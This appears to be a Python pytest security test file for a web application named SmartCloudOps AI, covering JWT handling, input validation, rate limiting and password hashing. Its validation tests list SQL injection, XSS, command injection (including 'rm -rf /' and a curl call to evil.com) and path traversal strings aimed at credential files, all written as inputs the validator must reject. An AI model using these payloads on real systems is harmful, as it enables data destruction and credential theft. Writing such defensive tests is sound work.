"""
Security tests for SmartCloudOps AI.
Phase 2: Testing Backbone - Security validation
"""

import os
import pytest
import jwt
from datetime import datetime, timedelta, timezone
from unittest.mock import patch, MagicMock

from app.auth import AuthManager
from app.security.input_validation import InputValidator


class TestSecurityConfiguration:
    """Test security configuration requirements."""""
    
    @pytest.mark.critical
    @pytest.mark.security
    def test_required_environment_variables(self):
        """Test that required security environment variables are validated."""""
        required_vars = [
            "SECRET_KEY",
            "JWT_SECRET_KEY",
            "DEFAULT_ADMIN_PASSWORD"
        ]
        
        for var in required_vars:
            assert os.environ.get(var), f"{var} must be set in environment"
    
    @pytest.mark.security
    def test_secret_key_length(self):
        """Test that secret keys meet minimum length requirements."""""
        secret_key = os.environ.get("SECRET_KEY", "")
        jwt_secret = os.environ.get("JWT_SECRET_KEY", "")
        
        # In test environment, we use test keys, but in production should be 32+ chars
        assert len(secret_key) >= 20, "SECRET_KEY should be at least 20 characters"
        assert len(jwt_secret) >= 20, "JWT_SECRET_KEY should be at least 20 characters"
    
    @pytest.mark.security
    def test_password_complexity_requirements(self):
        """Test password complexity requirements."""""
        admin_password = os.environ.get("DEFAULT_ADMIN_PASSWORD", "")
        assert len(admin_password) >= 16, "Admin password must be at least 16 characters"


class TestAuthentication:
    """Test authentication mechanisms."""""
    
    @pytest.mark.critical
    @pytest.mark.auth
    def test_jwt_token_generation(self):
        """Test JWT token generation."""""
        auth_manager = AuthManager()
        tokens = auth_manager.generate_tokens(
            user_id=1,
            username="testuser",
            role="admin"
        )
        
        assert "access_token" in tokens
        assert "refresh_token" in tokens
        assert tokens["access_token"] != tokens["refresh_token"]
    
    @pytest.mark.auth
    def test_jwt_token_verification(self):
        """Test JWT token verification."""""
        auth_manager = AuthManager()
        tokens = auth_manager.generate_tokens(
            user_id=1,
            username="testuser",
            role="admin"
        )
        
        # Verify access token
        payload = auth_manager.verify_token(tokens["access_token"], "access")
        assert payload is not None
        assert payload["user_id"] == 1
        assert payload["username"] == "testuser"
        assert payload["role"] == "admin"
    
    @pytest.mark.auth
    def test_expired_token_rejection(self):
        """Test that expired tokens are rejected."""""
        auth_manager = AuthManager()
        
        # Create an expired token
        expired_payload = {
            "user_id": 1,
            "username": "testuser",
            "role": "admin",
            "exp": datetime.now(timezone.utc) - timedelta(hours=1),
            "type": "access"
        }
        
        expired_token = jwt.encode(
            expired_payload,
            auth_manager.secret_key,
            algorithm=auth_manager.algorithm
        )
        
        # Verify token is rejected
        result = auth_manager.verify_token(expired_token, "access")
        assert result is None
    
    @pytest.mark.auth
    def test_invalid_token_rejection(self):
        """Test that invalid tokens are rejected."""""
        auth_manager = AuthManager()
        
        # Test various invalid tokens
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            "",
            None,
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid"
        ]
        
        for token in invalid_tokens:
            result = auth_manager.verify_token(token, "access")
            assert result is None, f"Invalid token should be rejected: {token}"
    
    @pytest.mark.auth
    def test_token_with_wrong_secret(self):
        """Test that tokens signed with wrong secret are rejected."""""
        auth_manager = AuthManager()
        
        # Create token with different secret
        wrong_secret_payload = {
            "user_id": 1,
            "username": "testuser",
            "role": "admin",
            "exp": datetime.now(timezone.utc) + timedelta(hours=1),
            "type": "access"
        }
        
        wrong_token = jwt.encode(
            wrong_secret_payload,
            "wrong-secret-key",
            algorithm="HS256"
        )
        
        result = auth_manager.verify_token(wrong_token, "access")
        assert result is None


class TestInputValidation:
    """Test input validation and sanitization."""""
    
    @pytest.mark.security
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention."""""
        validator = InputValidator()
        
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "admin' --",
            "1'; DELETE FROM anomalies WHERE '1'='1",
            "UNION SELECT * FROM users"
        ]
        
        for attempt in sql_injection_attempts:
            result = validator.validate_input(attempt, "sql")
            assert result["is_valid"] is False, f"SQL injection should be blocked: {attempt}"
            assert "sql injection" in result.get("error", "").lower()
    
    @pytest.mark.security
    def test_xss_prevention(self):
        """Test XSS attack prevention."""""
        validator = InputValidator()
        
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'>"
        ]
        
        for attempt in xss_attempts:
            result = validator.validate_input(attempt, "xss")
            assert result["is_valid"] is False, f"XSS should be blocked: {attempt}"
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test command injection prevention."""""
        validator = InputValidator()
        
        command_injection_attempts = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl evil.com)"
        ]
        
        for attempt in command_injection_attempts:
            result = validator.validate_input(attempt, "command")
            assert result["is_valid"] is False, f"Command injection should be blocked: {attempt}"
    
    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test path traversal prevention."""""
        validator = InputValidator()
        
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "file:///etc/passwd"
        ]
        
        for attempt in path_traversal_attempts:
            result = validator.validate_input(attempt, "path")
            assert result["is_valid"] is False, f"Path traversal should be blocked: {attempt}"


class TestRateLimiting:
    """Test rate limiting functionality."""""
    
    @pytest.mark.security
    def test_rate_limit_enforcement(self, client):
        """Test that rate limits are enforced."""""
        # Make multiple requests
        responses = []
        for _ in range(10):
            response = client.get("/api/status")
            responses.append(response)
        
        # Check if rate limiting is applied (implementation dependent)
        # This is a placeholder - actual implementation may vary
        assert all(r.status_code in [200, 429] for r in responses)
    
    @pytest.mark.security
    def test_rate_limit_headers(self, client):
        """Test that rate limit headers are present."""""
        response = client.get("/api/status")
        
        # Check for rate limit headers (if implemented)
        # Headers like X-RateLimit-Limit, X-RateLimit-Remaining, etc.
        # This depends on actual implementation
        assert response.status_code in [200, 429]


class TestSecurityHeaders:
    """Test security headers in responses."""""
    
    @pytest.mark.security
    def test_security_headers_present(self, client):
        """Test that security headers are present in responses."""""
        response = client.get("/api/status")
        
        # Check for security headers (when enabled)
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Content-Security-Policy"
        ]
        
        # In test environment, headers might not be enabled
        # This test documents expected behavior
        if os.environ.get("SECURITY_HEADERS_ENABLED") == "true":
            for header in expected_headers:
                assert header in response.headers, f"Security header {header} should be present"


class TestPasswordSecurity:
    """Test password security features."""""
    
    @pytest.mark.security
    def test_password_hashing(self):
        """Test that passwords are properly hashed."""""
        from werkzeug.security import generate_password_hash, check_password_hash
        
        password = "TestPassword123!@#"
        hashed = generate_password_hash(password)
        
        # Hash should not contain the original password
        assert password not in hashed
        assert len(hashed) > 50  # Bcrypt hashes are typically 60 chars
        assert hashed.startswith(("pbkdf2:sha256:", "scrypt:", "bcrypt:"))
        
        # Verify password check works
        assert check_password_hash(hashed, password)
        assert not check_password_hash(hashed, "WrongPassword")
    
    @pytest.mark.security
    def test_password_not_logged(self, caplog):
        """Test that passwords are not logged."""""
        import logging
        
        # Simulate password operations
        password_data = {
            "username": "testuser",
            "password": "SuperSecret123!@#"
        }
        
        # Log the data (this should sanitize password)
        logger = logging.getLogger(__name__)
        logger.info(f"Login attempt: {password_data}")
        
        # Check logs don't contain actual password
        assert "SuperSecret123!@#" not in caplog.text


class TestAPISecurity:
    """Test API security features."""""
    
    @pytest.mark.security
    @pytest.mark.api
    def test_api_requires_authentication(self, client):
        """Test that protected API endpoints require authentication."""""
        protected_endpoints = [
            "/api/anomalies",
            "/api/remediation",
            "/api/ml/train",
            "/api/chatops/query"
        ]
        
        for endpoint in protected_endpoints:
            response = client.get(endpoint)
            # Should return 401 Unauthorized without auth
            assert response.status_code in [401, 403], f"{endpoint} should require authentication"
    
    @pytest.mark.security
    @pytest.mark.api
    def test_api_validates_content_type(self, client):
        """Test that API validates content-type header."""""
        response = client.post(
            "/api/anomalies",
            data="not json",
            content_type="text/plain"
        )
        
        # Should reject non-JSON content for JSON endpoints
        assert response.status_code in [400, 415]


class TestDataProtection:
    """Test data protection features."""""
    
    @pytest.mark.security
    def test_sensitive_data_not_in_response(self, client, auth_headers):
        """Test that sensitive data is not exposed in API responses."""""
        # This test checks that sensitive fields are filtered
        # Actual implementation depends on your API
        pass  # Placeholder for actual implementation
    
    @pytest.mark.security
    def test_pii_data_masking(self):
        """Test that PII data is properly masked in logs."""""
        # Test that email, phone numbers, etc. are masked
        pass  # Placeholder for actual implementation


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
